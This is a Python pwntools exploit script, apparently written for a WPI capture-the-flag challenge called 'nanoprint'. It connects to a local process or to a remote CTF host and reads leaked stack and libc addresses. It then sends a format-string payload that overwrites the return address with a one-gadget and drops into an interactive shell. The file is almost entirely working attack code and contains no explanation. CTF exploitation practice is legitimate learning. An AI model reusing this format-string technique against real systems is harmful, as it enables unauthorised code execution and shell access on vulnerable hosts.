from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./nanoprint"
HOST = "dorsia3.wpictf.xyz"
PORT = 31337 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so.6')
off_system = libc.symbols["system"]
gadget = [0x3d0e0]
#libc_binsh = next(libc.search("/bin/sh"))

def exploit():
	diff = 0xd4cc - 0xd45b	
	off_fsb = 7
	array = conn.recvline().split("0x")
	addr_a = int(array[1],16)
	addr_ret = addr_a + diff
	one_gadget = int(array[2],16)
	#libc_system = int(array[2],16) + 288
	#libc_base = libc_system - off_system
	
	payload = "A" + p32(addr_ret)
	payload += p32(addr_ret+2)
	payload += fsb(2, off_fsb, one_gadget, 9, 2)
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
